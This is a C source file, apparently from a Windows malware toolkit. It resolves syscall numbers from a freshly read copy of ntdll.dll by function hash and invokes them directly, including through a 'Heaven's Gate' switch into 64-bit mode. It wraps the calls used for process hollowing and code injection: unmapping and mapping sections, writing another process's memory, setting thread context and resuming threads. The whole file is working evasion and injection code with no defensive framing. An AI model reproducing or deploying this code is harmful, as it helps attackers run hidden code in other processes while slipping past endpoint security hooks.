#include "syscall.h"

DWORD			get_syscall_number(unsigned long dwFuncHash)
{
	LPBYTE					ntptr = 0;
	unsigned int			i;
	LPBYTE					funcptr = 0;
	DWORD					dwVeryUseful;
	unsigned char			*seekptr = 0;
	WCHAR					wntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
	HANDLE					hNt_file = 0;
	LPBYTE					NtFilePtr = 0;
	DWORD					NtFileSize = 0;
	BOOL					has_failed = 0;
	PIMAGE_NT_HEADERS		pinh;
	PIMAGE_DOS_HEADER		pidh;
	PIMAGE_SECTION_HEADER	pish;
	APIs					a;
	DWORD					sys_num;

	a = load_api();
	has_failed = TRUE;
	do
	{

		if ((hNt_file = a.CreateFile(get_module_path(wntdll), GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)) == INVALID_HANDLE_VALUE)
			break;
		if ((NtFileSize = a.GetFileSize(hNt_file, 0)) == INVALID_FILE_SIZE)
			break;
		if (!(NtFilePtr = a.VirtualAlloc(NULL, NtFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
			break;
		if (!a.ReadFile(hNt_file, NtFilePtr, NtFileSize, &dwVeryUseful, 0))
			break;


		pidh = (PIMAGE_DOS_HEADER)NtFilePtr;
		pinh = (PIMAGE_NT_HEADERS)(pidh->e_lfanew + NtFilePtr);
		pish = IMAGE_FIRST_SECTION(pinh);

		if (!(ntptr = a.VirtualAlloc(NULL, pinh->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
			break;

		_memcpy(ntptr, NtFilePtr, pinh->OptionalHeader.SizeOfHeaders);
		for (i = 0; i < pinh->FileHeader.NumberOfSections; i++)
			_memcpy(ntptr + pish[i].VirtualAddress, NtFilePtr + pish[i].PointerToRawData, pish[i].SizeOfRawData);

		if (!(funcptr = get_proc_address(ntptr, dwFuncHash)))
			break;

		if (hNt_file)
			a.CloseHandle(hNt_file);
		if (NtFilePtr)
			a.VirtualFree(NtFilePtr, 0, MEM_RELEASE);

		has_failed = FALSE;

	} while (0);

	if (has_failed)
	{
		if (hNt_file)
			a.CloseHandle(hNt_file);
		if (ntptr)
			a.VirtualFree(ntptr, 0, MEM_RELEASE);
		if (NtFilePtr)
			a.VirtualFree(NtFilePtr, 0, MEM_RELEASE);
		
		a.ExitProcess(0);
	}

	seekptr = funcptr;
	while (1)
	{
		if (*seekptr == 0xB8)
			break;
		if (*seekptr == 0xE9)
			seekptr = (*(DWORD *)(seekptr + 1)) + seekptr + 5;
		else if (*seekptr == 0xEA)
			seekptr = (*(DWORD *)(seekptr + 1));
		else
			seekptr++;
	}

	sys_num = *((DWORD*)++seekptr);

	if (ntptr)
		a.VirtualFree(ntptr, 0, MEM_RELEASE);

	return (sys_num);
}

__declspec(naked) void	KiFastSystemCall(void)
{
	__asm
	{
		mov edx, esp
		__emit(0x0F)
		__emit(0x34)
		ret
	}
}

LPVOID WINAPI	mVirtualAllocEx(
		_In_     HANDLE hProcess,
		_In_opt_ LPVOID lpAddress,
		_In_     SIZE_T dwSize,
		_In_     DWORD  flAllocationType,
		_In_     DWORD  flProtect
)
{
	ULONGLONG		NtAllocateVirtualMemory[6];
	ULONGLONG _lpAddress = (ULONGLONG)lpAddress;
	ULONGLONG _dwSize = (ULONGLONG)dwSize;


	_memset(&NtAllocateVirtualMemory, 0, sizeof(NtAllocateVirtualMemory));
	if (IsCurrentProcessWow64(load_api()))
	{
		NtAllocateVirtualMemory[0] = (ULONGLONG)(hProcess);
		NtAllocateVirtualMemory[1] = (ULONGLONG)(&_lpAddress);
		NtAllocateVirtualMemory[2] = (ULONGLONG)(0);
		NtAllocateVirtualMemory[3] = (ULONGLONG)(&_dwSize);
		NtAllocateVirtualMemory[4] = (ULONGLONG)(flAllocationType);
		NtAllocateVirtualMemory[5] = (ULONGLONG)(flProtect);
		return (SysCall64(get_syscall_number(0xE0762FEB), &NtAllocateVirtualMemory[0], sizeof(NtAllocateVirtualMemory) / sizeof(ULONGLONG)) ? FALSE : lpAddress);
	}
	else
		return (sys_ntavm(hProcess, &lpAddress, 0, &dwSize, flAllocationType, flProtect) ? FALSE : lpAddress);
	
}

BOOL WINAPI		mWriteProcessMemory(
	_In_  HANDLE  hProcess,
	_In_  LPVOID  lpBaseAddress,
	_In_  LPCVOID lpBuffer,
	_In_  SIZE_T  nSize,
	_Out_ SIZE_T  *lpNumberOfBytesWritten
)
{
	ULONGLONG		NtWriteVirtualMemory[5];
	ULONG			NtStatus;
	ULONGLONG		_lpNumberOfBytesWritten = 0;

	_memset(NtWriteVirtualMemory, 0, sizeof(NtWriteVirtualMemory));
	if (IsCurrentProcessWow64(load_api()))
	{
		NtWriteVirtualMemory[0] = (ULONGLONG)(hProcess);
		NtWriteVirtualMemory[1] = (ULONGLONG)(lpBaseAddress);
		NtWriteVirtualMemory[2] = (ULONGLONG)(lpBuffer);
		NtWriteVirtualMemory[3] = (ULONGLONG)(nSize);
		NtWriteVirtualMemory[4] = (ULONGLONG)(&_lpNumberOfBytesWritten);
		NtStatus = SysCall64(get_syscall_number(0xE4879939), &NtWriteVirtualMemory[0], sizeof(NtWriteVirtualMemory) / sizeof(ULONGLONG));
		if (lpNumberOfBytesWritten)
			*lpNumberOfBytesWritten = (ULONG)_lpNumberOfBytesWritten;
	}else
		NtStatus = sys_ntwvm(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
	return (NtStatus ? FALSE : TRUE);
}

BOOL WINAPI mSetThreadContext(
	_In_       HANDLE  hThread,
	_In_ const CONTEXT *lpContext
	)
{
	ULONGLONG		NtSetContextThread[2];
	ULONG			NtStatus;

	_memset(NtSetContextThread, 0, sizeof(NtSetContextThread));
	if (IsCurrentProcessWow64(load_api()))
	{
		NtSetContextThread[0] = (ULONGLONG)(hThread);
		NtSetContextThread[1] = (ULONGLONG)(lpContext);
		NtStatus = SysCall64(get_syscall_number(0xE1453B98), &NtSetContextThread[0], sizeof(NtSetContextThread) / sizeof(ULONGLONG));
	}
	else
		NtStatus = sys_ntsct(hThread, lpContext);
	return (NtStatus ? FALSE : TRUE);
}

DWORD WINAPI mResumeThread(
	_In_ HANDLE hThread
	)
{
	ULONGLONG		NtResumeThread[2];
	ULONG			NtStatus;
	ULONGLONG		SuspendCount = 0;

	_memset(NtResumeThread, 0, sizeof(NtResumeThread));
	if (IsCurrentProcessWow64(load_api()))
	{
		NtResumeThread[0] = (ULONGLONG)(hThread);
		NtResumeThread[1] = (ULONGLONG)(&SuspendCount);
		NtStatus = SysCall64(get_syscall_number(0x6273B572), &NtResumeThread[0], sizeof(NtResumeThread) / sizeof(ULONGLONG));
	}
	else
		NtStatus = sys_ntrt(hThread, &SuspendCount);
	return (NtStatus ? FALSE : TRUE);
}

NTSTATUS NTAPI mNtUnmapViewOfSection(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
	)
{
	ULONGLONG		NtUnmapViewOfSection[2];
	ULONG			NtStatus;

	_memset(NtUnmapViewOfSection, 0, sizeof(NtUnmapViewOfSection));
	if (IsCurrentProcessWow64(load_api()))
	{
		NtUnmapViewOfSection[0] = (ULONGLONG)(ProcessHandle);
		NtUnmapViewOfSection[1] = (ULONGLONG)(BaseAddress);
		NtStatus = SysCall64(get_syscall_number(0x90483FF6), &NtUnmapViewOfSection[0], sizeof(NtUnmapViewOfSection) / sizeof(ULONGLONG));
	}
	else
		NtStatus = sys_ntumvs(ProcessHandle, BaseAddress);
	return (NtStatus);
}



NTSTATUS NTAPI mNtCreateSection(
	_Out_    PHANDLE            SectionHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER     MaximumSize,
	_In_     ULONG              SectionPageProtection,
	_In_     ULONG              AllocationAttributes,
	_In_opt_ HANDLE             FileHandle
)
{
	ULONGLONG		NtCreateSection[7];
	ULONG			NtStatus;
	ULONGLONG		_SectionHandle = 0;

	_memset(NtCreateSection, 0, sizeof(NtCreateSection));
	if (IsCurrentProcessWow64(load_api()))
	{
		NtCreateSection[0] = (ULONGLONG)(&_SectionHandle);
		NtCreateSection[1] = (ULONGLONG)(DesiredAccess);
		NtCreateSection[2] = (ULONGLONG)(ObjectAttributes);
		NtCreateSection[3] = (ULONGLONG)(MaximumSize);
		NtCreateSection[4] = (ULONGLONG)(SectionPageProtection);
		NtCreateSection[5] = (ULONGLONG)(AllocationAttributes);
		NtCreateSection[6] = (ULONGLONG)(FileHandle);
		NtStatus = SysCall64(get_syscall_number(0x9EEE4B80), &NtCreateSection[0], sizeof(NtCreateSection) / sizeof(ULONGLONG));
		if (SectionHandle)
			*SectionHandle = (HANDLE)_SectionHandle;
	}
	else
		NtStatus = sys_ntcs(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
	return (NtStatus);
}

NTSTATUS NTAPI mNtMapViewOfSection(
	_In_        HANDLE          SectionHandle,
	_In_        HANDLE          ProcessHandle,
	_Inout_     PVOID           *BaseAddress,
	_In_        ULONG_PTR       ZeroBits,
	_In_        SIZE_T          CommitSize,
	_Inout_opt_ PLARGE_INTEGER  SectionOffset,
	_Inout_     PSIZE_T         ViewSize,
	_In_        DWORD			InheritDisposition,
	_In_        ULONG           AllocationType,
	_In_        ULONG           Win32Protect
)
{
	ULONGLONG		NtMapViewOfSection[10];
	ULONG			NtStatus;
	ULONGLONG		_BaseAddress = 0;
	ULONGLONG		_ViewSize = 0;

	if (!BaseAddress)
		return (1);
	if (!ViewSize)
		return (1);

	_BaseAddress = (ULONGLONG)*BaseAddress;
	_ViewSize = (ULONGLONG)*ViewSize;

	_memset(NtMapViewOfSection, 0, sizeof(NtMapViewOfSection));
	if (IsCurrentProcessWow64(load_api()))
	{
		NtMapViewOfSection[0] = (ULONGLONG)(SectionHandle);
		NtMapViewOfSection[1] = (ULONGLONG)(ProcessHandle);
		NtMapViewOfSection[2] = (ULONGLONG)(&_BaseAddress);
		NtMapViewOfSection[3] = (ULONGLONG)(ZeroBits);
		NtMapViewOfSection[4] = (ULONGLONG)(CommitSize);
		NtMapViewOfSection[5] = (ULONGLONG)(SectionOffset);
		NtMapViewOfSection[6] = (ULONGLONG)(&_ViewSize);
		NtMapViewOfSection[7] = (ULONGLONG)(InheritDisposition);
		NtMapViewOfSection[8] = (ULONGLONG)(AllocationType);
		NtMapViewOfSection[9] = (ULONGLONG)(Win32Protect);
		NtStatus = SysCall64(get_syscall_number(0xA4163EBC), &NtMapViewOfSection[0], sizeof(NtMapViewOfSection) / sizeof(ULONGLONG));
		*BaseAddress = (ULONG)_BaseAddress;
		*ViewSize = (ULONG)_ViewSize;
	}
	else
		NtStatus = sys_ntmvos(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
	return (NtStatus);
}

__declspec(naked) NTSTATUS NTAPI sys_ntmvos(
	_In_        HANDLE          SectionHandle,
	_In_        HANDLE          ProcessHandle,
	_Inout_     PVOID           *BaseAddress,
	_In_        ULONG_PTR       ZeroBits,
	_In_        SIZE_T          CommitSize,
	_Inout_opt_ PLARGE_INTEGER  SectionOffset,
	_Inout_     PSIZE_T         ViewSize,
	_In_        DWORD			InheritDisposition,
	_In_        ULONG           AllocationType,
	_In_        ULONG           Win32Protect
)
{
	__asm
	{
		push 0xA4163EBC
		call get_syscall_number
		call KiFastSystemCall
		ret 0x28
	}
}


__declspec(naked) NTSTATUS NTAPI sys_ntcs(
	_Out_    PHANDLE            SectionHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PLARGE_INTEGER     MaximumSize,
	_In_     ULONG              SectionPageProtection,
	_In_     ULONG              AllocationAttributes,
	_In_opt_ HANDLE             FileHandle
)
{
	__asm
	{
		push 0x9EEE4B80
		call get_syscall_number
		call KiFastSystemCall
		ret 0x1C
	}
}

__declspec(naked) NTSTATUS NTAPI sys_ntumvs(
	_In_     HANDLE ProcessHandle,
	_In_opt_ PVOID  BaseAddress
)
{
	__asm
	{
		push 0x90483FF6
		call get_syscall_number
		call KiFastSystemCall
		ret 0x8
	}
}


__declspec(naked) NTSTATUS NTAPI sys_ntrt(
	IN HANDLE               ThreadHandle,
	OUT PULONG              SuspendCount OPTIONAL)
{
	__asm
	{
		push 0x6273B572
		call get_syscall_number
		call KiFastSystemCall
		ret 0x8
	}
}

__declspec(naked) NTSTATUS NTAPI sys_ntsct(
	IN HANDLE               ThreadHandle,
	IN PCONTEXT             Context)
{
	__asm
	{
		push 0xE1453B98
		call get_syscall_number
		call KiFastSystemCall
		ret 0x8
	}
}
			
__declspec(naked) NTSTATUS NTAPI sys_ntavm(
	_In_    HANDLE    ProcessHandle,
	_Inout_ PVOID     *BaseAddress,
	_In_    ULONG_PTR ZeroBits,
	_Inout_ PSIZE_T   RegionSize,
	_In_    ULONG     AllocationType,
	_In_    ULONG     Protect
	)
{
	__asm
	{
		push 0xE0762FEB
		call get_syscall_number
		call KiFastSystemCall
		ret 0x18
	}
}

__declspec(naked) NTSTATUS NTAPI sys_ntwvm(
	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten
)
{
	__asm
	{
		push 0xE4879939
		call get_syscall_number
		call KiFastSystemCall
		ret 0x14
	}
}

ULONGLONG GetNextArgument(PULONG ulCurrentArg, ULONG ulArgCount, PULONGLONG pulArgs)
{
	ULONGLONG NextArg = 0;
	if (*ulCurrentArg < ulArgCount)
	{
		NextArg = pulArgs[(*ulCurrentArg)++];
	}
	return NextArg;
}



#pragma warning(push)
#pragma warning(disable:4409)
ULONG SysCall64(ULONG ulOrdinal, PULONGLONG pulArgs, ULONG ulArgCount)
{

	ULONG ulNtStatus = 0;
	ULONGLONG StackArguments = 0;
	ULONGLONG StackCount = 0;
	ULONG ulCurrentArg = 0;
	ULONG StackAlignment = 40;
	ULONG Backup = 0;

	ULONGLONG Arg1 = GetNextArgument(&ulCurrentArg, ulArgCount, pulArgs);
	ULONGLONG Arg2 = GetNextArgument(&ulCurrentArg, ulArgCount, pulArgs);
	ULONGLONG Arg3 = GetNextArgument(&ulCurrentArg, ulArgCount, pulArgs);
	ULONGLONG Arg4 = GetNextArgument(&ulCurrentArg, ulArgCount, pulArgs);

	if (ulArgCount > 4)
	{
		StackArguments = (ULONGLONG)&pulArgs[3];
		StackCount = ulArgCount - 4;
		StackAlignment += ((((ULONG)StackCount * 8) + StackAlignment) % 16) + ((ULONG)StackCount * 8);
	}

	__asm
	{
		push edi
		push esi
		mov Backup, esp
		and esp, 0xFFFFFFF0 //Align pointer to 16 bytes.

		EnterHeavensGate()



		sub esp, StackAlignment


		push Arg1

		EMIT(0x59) //pop rcx
		push Arg2
		EMIT(0x5A) //pop rdx
		push Arg3
		EMIT(0x41) EMIT(0x58) //pop r8
		push Arg4
		EMIT(0x41) EMIT(0x59) //pop r9


		push StackArguments
		EMIT(0x5F) //pop rdi
		push StackCount
		EMIT(0x5E) //pop rsi



		test esi, esi
		jz SysCall
		LoadStack :

		EMIT(0x67) EMIT(0x48) EMIT(0x8B) EMIT(0x0C) EMIT(0xF7)
			EMIT(0x67) EMIT(0x48) EMIT(0x89) EMIT(0x4C) EMIT(0xF4) EMIT(0x20)
			sub esi, 1
			jnz LoadStack



		SysCall :
			push Arg1
			EMIT(0x41) EMIT(0x5A) //pop r10

			mov eax, ulOrdinal
			EMIT(0x0F) EMIT(0x05)  //syscall

			mov ulNtStatus, eax


			add esp, StackAlignment

			LeaveHeavensGate()
			mov esp, Backup
			pop esi
			pop edi
	}

	return ulNtStatus;
}
#pragma warning (pop)
